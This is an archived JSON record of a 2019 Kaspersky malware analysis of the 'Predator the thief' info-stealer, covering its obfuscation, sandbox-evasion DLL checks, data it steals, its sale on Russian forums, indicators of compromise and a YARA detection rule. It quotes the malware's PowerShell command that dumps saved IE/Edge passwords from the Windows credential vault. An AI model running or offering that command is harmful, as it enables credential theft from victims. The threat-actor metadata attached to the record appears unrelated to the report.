{
    "id": "bb4cdd05-d99d-4c9c-be81-34594d4c2611",
    "created_at": "2023-01-12T15:06:45.128437Z",
    "updated_at": "2025-03-27T02:15:35.496553Z",
    "deleted_at": null,
    "sha1_hash": "5c32088114d43b6bf2f6c497660a2587dbc91f87",
    "title": "2019-03-11 - A predatory tale- Who’s afraid of the thief-",
    "authors": "",
    "file_creation_date": "2022-05-28T02:03:43Z",
    "file_modification_date": "2022-05-28T02:03:43Z",
    "file_size": 1404808,
    "plain_text": "# A predatory tale: Who’s afraid of the thief?\n\n**securelist.com/a-predatory-tale/89779**\n\nAuthors\n\nGReAT\n\nIn mid-February, Kaspersky Lab received a request for incident response from one of its clients. The individual who\ninitially reported the issue to our client refused to disclose the origin of the indicator that they shared. What we do know\nis that it was a screenshot from one of the client’s internal computers taken on February 11 while an employee was\napparently browsing through his emails. In addition, the anonymous source added that the screenshot was transferred\nto a C2 using a stealer dubbed ‘Predator’.\n\nAs soon as the client contacted us, we started conducting a full investigation into the infected machine, including\nmemory dumps, event logs, environment indicators from the network and so on and so forth. Finding very little\ninformation about this tool, we decided that seeing as how we’d already dived into the stealer, we might as well share\nsome of our main findings in case other incidents occur in the future. The purpose of this blogpost is to enumerate the\nPredator stealer’s versions, technical features, indicators and Yara rule signatures, to help monitor and detect new\nsamples, and to provide general information about its owners’ activities.\n\nAs well as all the information we collected from the client, we went the extra mile and contacted a source who had\npreviously analyzed Predator. This source was [@Fumik0_, a French malware researcher who analyzed versions 2.3.5](https://twitter.com/fumik0_)\n[and 2.3.7 in his blog just a few months ago (October 2018).](https://fumik0.com/2018/10/15/predator-the-thief-in-depth-analysis-v2-3-5/)\n\nHe joined Ido Naor, a principal security researcher at Kaspersky Lab and together they compiled a full analysis of the\nnew versions of ‘Predator the thief’.\n\n[The blog was apparently so influential that the owners of the stealer decided to contact Fumik0 via Twitter. An account](https://twitter.com/Alexupi1/status/1051876412142100482)\nnamed Alexuiop1337 claiming to be the owner of Predator is also active and has been responding to Fumik0’s\n[discoveries until fairly recently.](https://twitter.com/fumik0_/status/1096344351490404352)\n\n\n-----\n\n## Predator the thief\n\nPredator is a data stealer developed by Russian-speaking individuals. It’s being sold cheaply on Russian forums and\nhas been detected many times in the wild. Although detection is successful with previous versions, its owners are\nrapidly adapting by generating FUD (Fully UnDetectable) samples every few days. The owners are not responsible for\nthe victim attack vector and are only selling the builder. For a small additional payment they can also generate an\nadministration panel for customers. The newest samples were exposed on their Telegram group; however, the links\nonly redirect to a little-known AV aggregator which we don’t have access to. We’re currently tracking the samples’\nhashes and waiting for triggers to show up.\n\n**latest version** v3.0.7\n\n**Sample MD5** bf4cd781920f2bbe57e7e74a775b8e94\n\n**Code Language** C++\n\n**File Types** PE\n\n**Supported Arch.** x86 and x64\n\n**Unpacked Size** <500Kb\n\n**Admin Panel Example** https://predatortop.xyz/login\n\n**Admin Panel Software** PHP, Apache, Ubuntu\n\n## From v2 to v3\n\nPredator, as a stealer, is considered simple and cheap. It’s good for attacking individuals and small businesses, but as\nfar as large companies go, protection solutions and response teams can detect and remove its activity in a relatively\nshort amount of time.\n\nThat said, the owners of Predator are very business oriented. They’re constantly updating their software, attempting to\nextend features and adjusting to client requirements and are generally not that aggressive when it comes to\ndisclosure/analysis of their tool.\n\n**Obfuscation**\n\nPredator’s owners decided to obfuscate most of its code with a number of simple techniques. XOR, Base64,\nSubstitutions, Stack strings and more are being used to hide API methods, Folder paths, Register keys, the C2\nserver/Admin panel and so on.\n\nWe sketched a flow chart for one of the obfuscation techniques. A large chunk of code boiled down to one Windows\nAPI call, which we see as a bit like overkill considering the fact that other techniques can be applied to strip the\nobfuscation.\n\n\n-----\n\nWe’ve written down a list for those who are after a step-by-step guide:\n\nStep Description\n\n0 Saving arguments somewhere\n\n1 Get the function name\n\n2 Get the library name\n\n3 Recreating GetProcAddress\n\n4 Calling function by a simple register call\n\n**Export table**\n\nIt was also found that the export table trick for getting the API function is far more complex than the one introduced in\nv2:\n\n\n-----\n\n**Anti-debugging/sandbox checks**\n\nPredator retains its old techniques for sandbox evasion, but keeps adding more and more features. One of them, for\nexample, is a hardcoded list of DLLs that are checked if loaded into memory:\n\nsbiedll dbghelp api_log pstorec dir_watch vmcheck wpespy SxIn Sf2\n\n_Loop for checking list of DLLs_\n\nOne old trick, for example, that survived the version update is the check of Graphic Card Name introduced in v2.x.x.\n\n**Classy but mandatory – browser stealer support**\n\nEdge and Internet Explorer support was recently added to the list of browsers. The actions taken, however, are\ndifferent from the malware decision-making with the Gecko and Chromium browsers. In previous versions, Predator\nusually uses a temporary file (*.col format file) to store browser content (in an SQLite3 database), but for Edge and IE it\nwas replaced with a hardcoded PowerShell command that will directly put the content of the file into a dedicated\nrepository..\n\n\n-----\n\n1\n\n2\n\n\npowershell.exe -Command\n\n\"[void]\n\n[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];$vault\n= New-Object Windows.Security.Credentials.PasswordVault; $b = 'Browser: Internet Explorer | Edge'; $a =\n($vault.RetrieveAll() | % { $_.RetrievePassword(); $_ } | SELECT UserName, Password, Resource | Format-List\nResource, UserName, Password) | Out-String; $c = $b + $a; $c = $c.Replace('Resource :',\n'Url:').Replace('UserName :', 'Login:').Replace('Password :', 'Password:'); $c >\n\"%PREDATOR_PATH%\\General\\IeEdgePasswords.txt\"\n\n\nAs a reminder, Predator currently supports the following list of browser data theft, according to the info on the ‘official’\nsales page:\n\n**The false keylogger feature**\n\nThe owners of Predator list keylogger capabilities among its features, though a closer inspection of the code reveals\nthat no keylogging is carried out. The behavior we captured is clearly that of a clipboard stealer. The functionality\nincludes a crawler that checks if the clipboard contains data, grabs it and places it in a dedicated file the stealer owners\nhave named ‘information.log’.\n\n**Thief logs**\n\nDiving into the file discussed in the clipboard stealer section above, we saw drastic changes from previous versions.\nThe information logger is perhaps the most important collector of Predator. It stores all the tasks performed by the\nstealer on the victim machine.\n\nWe noticed that in previous minor versions, logs started collecting data that might be of interest to potential customers,\nsuch as:\n\nHWID\nSystem Language\nKeyboard Layout\n\nAt the end of the report, the owners added a customer/payload ID – probably to improve support.\n\n**Updates**\n\nPredator is continually integrating new software into the stealing list and fixing bugs to maintain its stability and its\npopularity. Here’s a summary of the new features in v3:\n\n\n-----\n\n**Location** **Data stolen**\n\nGames Osu\nBattle.net\n\nFTP WinSCP\n\nVPN NordVPN\n\n2FA Authy\n\nMessengers Pidgin\n\nSkype\n\nOperating System Webcam\n\nHWID\n\nClipboard\n\nSpecific document files (Grabber)\n\n**Project filenames***\n\nBrowsers IE/Edge\n\n*We noticed that the newest version of Predator has started collecting a list of .sln file names. These are project files\nusually generated by Visual Studio. We still have no idea if this is related to client demand for a future feature.\n\n## Sale point (Russian forums)\n\nWe found a very active seller of Predator on a forum called VLMI. It appears the main language on VLMI is Russian\nand the content mainly revolves around cyberattacks. In addition, the forum has a very strict set of rules that might get\nyou banned if broken. The two sections (translated using Google) in the image below are examples of forbidden\nbehavior.\n\nIt was also appears that each offer on the forum must go through a reviewer who decides if the piece of software or\nservice is of financial benefit to the forum administrators, but at the same time fair towards other members.\n\nFor 8,000 rubles (~$120) worth of software, the forum will charge a 20% fee; if the value goes above 100,000 rubles\n(~$1,500), the commission decreases to 10%.\n\nThe Predator stealer’s main sales thread was found here:\n\nhttps://vlmi.biz/threads/predator-the-thief-nativnyj-stiller-s-bolshim-funkcionalom-luchshaja-cena.21069/\n\n\n-----\n\nPredator costs 2,000 rubles (~$30) for the stealer and admin panel. There is also an optional service to help the\ncustomer install the C&C. This is not as expensive as other stealers on the market, such as Vidar and HawkEye, but its\ndevelopers are proactive in delivering updates and ensuring a fast and effective support service.\n\n**Telegram as a service**\n\nPredator’s main channel for updating their customers is Telegram. At the time of writing, the administrators were\nhosting over 370 members in this group:\n\nhttps://t.me/PredatorSoftwareChannel\n\nAnother update channel is the seller @sett9.\n\n\n-----\n\nIt appears the Predator administrators are demonstrating FUD capabilities by running a sample generated by the\nbuilder of their stealer. However, some samples from their latest update (v3.0.7) have already been detected by\nKaspersky products as: Trojan-PSW.Win32.Predator.qy (25F9EC882EAC441D4852F92E0EAB8595), while others\nare detected by heuristics.\n\nhttps://scanmybin.net/result/af76a5666e5230cf087c270c51c2dfdc4324c365dc6f93c0f3ae7ce24f9db992\nhttps://run4me.net/result/80163ed2bede58aff68a3bdf802917c61c78a05f37a3caf678ce5491f00d39b0\n\nThe executables above were not found in VirusTotal. According to the group, the links were posted around August of\nlast year (2018). Numerous media uploads on the Telegram group revealed dozens of infected victims.\n\n\n-----\n\nOn the day we looked at the Telegram group (February 17, 2019), the latest build (v3.0.7) was released. According to\nthe owners’ release notes, it was implemented with WinSCP and NordVPN support.\n\n## IOCs\n\n**IP/Domains:**\n\n**Predator version** **IP/Domain**\n\nv3.0.3 15charliescene15[.]myjino[.]ru\n\nv3.0.4 axixaxaxu1337[.]us\n\nv3.0.5 madoko[.]jhfree[.]net\n\nv3.0.6 kristihack46[.]myjino[.]ru\n\nv3.0.7 j946104[.]myjino[.]ru\n\n**Hashes:**\n\n**Predator version** **MD5 Hash**\n\nv3.0.3 c44920c419a21e07d753ed607fb6d7ca\n\nv3.0.4 cf2273b943edd0752a09e90f45958c85\n\nv3.0.5 b2cbb3d80c8d830a3b3c2bd568ba1826\n\nv3.0.6 dff67a78bb4866f9da5a0c1781ed5348\n\nv3.0.7 25F9EC882EAC441D4852F92E0EAB8595\n\n**Yara:**\n\n1 rule Predator_The_Thief : Predator_The_Thief {\n\n\n-----\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\n26\n\n27\n\n28\n\n29\n\n30\n\n31\n\n32\n\n33\n\n34\n\n35\n\n\nmeta:\n\ndescription = \"Yara rule for Predator The Thief 3.0.0+\"\n\nauthor = \"Fumik0_\"\n\ndate = \"2018/10/12\"\n\nupdate = \"2019/02/26\"\n\nstrings:\n\n$mz = { 4D 5A }\n\n/*\n\nPredator V3.0.0+\n\n*/\n\n$x1 = { C6 84 24 ?? ?? 00 00 8C }\n\n$x2 = { C6 84 24 ?? ?? 00 00 1A }\n\n$x3 = { C6 84 24 ?? ?? 00 00 D4 }\n\n$x4 = { C6 84 24 ?? ?? 00 00 03 }\n\n$x5 = { C6 84 24 ?? ?? 00 00 B4 }\n\n$x6 = { C6 84 24 ?? ?? 00 00 80 }\n\n/*\n\nPredator V3.0.3 -&gt; 3.0.6\n\n*/\n\n$y1 = { B8 00 E1 F5 05 }\n\n$y2 = { 89 5C 24 0C }\n\n$y3 = { FF 44 24 ?? }\n\n$y4 = { 39 44 24 0C }\n\n$y5 = { BF 00 00 A0 00 }\n\ncondition:\n\n$mz at 0 and\n\n(\n\n( all of ($x*))\n\nor\n\n(all of ($y*))\n\n)\n\n}\n\n\n-----\n\n[Data theft](https://securelist.com/tag/data-theft/)\n[Keyloggers](https://securelist.com/tag/keyloggers/)\n[Malware Descriptions](https://securelist.com/tag/malware-descriptions/)\n[Obfuscation](https://securelist.com/tag/obfuscation/)\n[Russian-speaking cybercrime](https://securelist.com/tag/russian-speaking-cybercrime/)\n[Targeted attacks](https://securelist.com/tag/targeted-attacks/)\n\nAuthors\n\nGReAT\n\nA predatory tale: Who’s afraid of the thief?\n\nYour email address will not be published. Required fields are marked *\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-03-11 - A predatory tale- Who’s afraid of the thief-.pdf"
    ],
    "report_names": [
        "2019-03-11 - A predatory tale- Who’s afraid of the thief-.pdf"
    ],
    "threat_actors": [
        {
            "id": "9f101d9c-05ea-48b9-b6f1-168cd6d06d12",
            "created_at": "2023-01-06T13:46:39.396409Z",
            "updated_at": "2025-03-27T02:00:03.074969Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "CHROMIUM",
                "ControlX",
                "Red Dev 10",
                "RedHotel",
                "Red Scylla",
                "TAG-22",
                "BRONZE UNIVERSITY",
                "AQUATIC PANDA",
                "Charcoal Typhoon",
                "BountyGlad"
            ],
            "source_name": "MISPGALAXY:Earth Lusca",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "c3ef437d-e8fa-4250-9a99-89a403035ad2",
            "created_at": "2022-10-25T16:07:24.406019Z",
            "updated_at": "2025-03-27T02:02:10.210953Z",
            "deleted_at": null,
            "main_name": "WildPressure",
            "aliases": [
                "WilePressure"
            ],
            "source_name": "ETDA:WildPressure",
            "tools": [
                "Milum"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "6abcc917-035c-4e9b-a53f-eaee636749c3",
            "created_at": "2022-10-25T16:07:23.565337Z",
            "updated_at": "2025-03-27T02:02:09.868522Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Bronze University",
                "Charcoal Typhoon",
                "Chromium",
                "Red Dev 10",
                "Red Scylla"
            ],
            "source_name": "ETDA:Earth Lusca",
            "tools": [
                "Agentemis",
                "AntSword",
                "BIOPASS",
                "BIOPASS RAT",
                "BadPotato",
                "Behinder",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "Doraemon",
                "FRP",
                "Fast Reverse Proxy",
                "FunnySwitch",
                "HUC Port Banner Scanner",
                "KTLVdoor",
                "Mimikatz",
                "NBTscan",
                "POISONPLUG.SHADOW",
                "PipeMon",
                "RbDoor",
                "RibDoor",
                "RouterGod",
                "SAMRID",
                "ShadowPad Winnti",
                "SprySOCKS",
                "WinRAR",
                "Winnti",
                "XShellGhost",
                "cobeacon",
                "fscan",
                "lcx",
                "nbtscan"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d53593c3-2819-4af3-bf16-0c39edc64920",
            "created_at": "2022-10-27T08:27:13.212301Z",
            "updated_at": "2025-03-27T02:00:55.529662Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Earth Lusca",
                "TAG-22",
                "Charcoal Typhoon",
                "CHROMIUM",
                "ControlX"
            ],
            "source_name": "MITRE:Earth Lusca",
            "tools": [
                "Mimikatz",
                "PowerSploit",
                "Tasklist",
                "certutil",
                "Cobalt Strike",
                "Winnti for Linux",
                "Nltest",
                "NBTscan",
                "ShadowPad"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673536005,
    "ts_updated_at": 1743041735,
    "ts_creation_date": 1653703423,
    "ts_modification_date": 1653703423,
    "files": {
        "pdf": "https://archive.orkl.eu/5c32088114d43b6bf2f6c497660a2587dbc91f87.pdf",
        "text": "https://archive.orkl.eu/5c32088114d43b6bf2f6c497660a2587dbc91f87.txt",
        "img": "https://archive.orkl.eu/5c32088114d43b6bf2f6c497660a2587dbc91f87.jpg"
    }
}